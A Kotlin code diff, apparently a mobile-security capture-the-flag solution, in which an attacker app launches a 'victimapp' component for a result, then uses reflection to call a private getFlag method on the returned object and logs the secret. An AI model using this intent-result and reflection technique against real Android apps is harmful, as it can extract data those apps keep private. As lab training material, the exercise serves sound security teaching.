@@ -11,9 +11,15 @@ import androidx.appcompat.app.AppCompatActivity
 import com.example.victimapp.FlagContainer
 
 class MainActivity : AppCompatActivity() {
+    val TAG = "MOBIOTSEC"
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+    }
+
+    override fun onStart() {
+        super.onStart()
 
         val intent = Intent().apply {
             component = ComponentName(
@@ -23,11 +29,22 @@ class MainActivity : AppCompatActivity() {
         }
         val contract = ActivityResultContracts.StartActivityForResult()
         registerForActivityResult(contract) { result ->
-            val container = result
-                .data
-                ?.getSerializableExtra("flag", FlagContainer::class.java)
+            try {
+                val container = result
+                    .data
+                    ?.getSerializableExtra("flag", FlagContainer::class.java)
 
-            container?.let { Log.d("MOBIOTSEC", it.getFlag()) }
+                container?.let {
+                    val flag = it::class
+                        .java
+                        .getDeclaredMethod("getFlag")
+                        .apply { setAccessible(true) }
+                        .invoke(it)
+                    Log.d(TAG, "The flag is $flag")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, e.toString())
+            }
         }.launch(intent)
     }
 }
